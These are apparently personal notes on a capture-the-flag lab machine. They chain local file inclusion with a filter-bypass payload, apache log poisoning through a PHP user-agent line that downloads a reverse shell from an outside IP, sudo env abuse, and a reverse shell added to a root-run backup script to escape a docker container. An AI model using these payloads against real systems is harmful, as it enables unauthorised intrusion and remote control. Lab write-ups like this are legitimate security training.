maintain privileged shell

shell inside docker container


## Gaining Access 😉
- LFI found, [[#Important commands 🔥]] 1
- apache log poisoning, uploaded php revshell [[#Important commands 🔥]] 2



## Maintaining Access 🥷
- env binary found as sudo, exploited
- we have a backup.sh that runs every minute, taking the backup.tar to **/root/container** adding a reverse shell to the backup script may give us access to the host root. Since it interacts with the host root folders, the backup.sh is probably created by the host and ran by the host
- added bash revshell on it. to get privileged shell


## Important commands 🔥
1. lfi filterbypass
	```
	?view=dog(../../../../../etc/passwd&ext
	```
2. php shell upload user agent
	```
	<?php file_put_contents('shell.php', file_get_contents('http://10.9.229.254/rev.php'))?>
	GET /?view=dog(../../../../../../../var/log/apache2/access.log&ext= HTTP/1.1
	```
3. find flag
	```
	find / -type f -name flag1* 2>/dev/null
	```
	

## Post Exploitation ✴️
- User flag : /home/user
- Root flag : /root/root
## Tips 💡
- container inside box
- lfi to rce
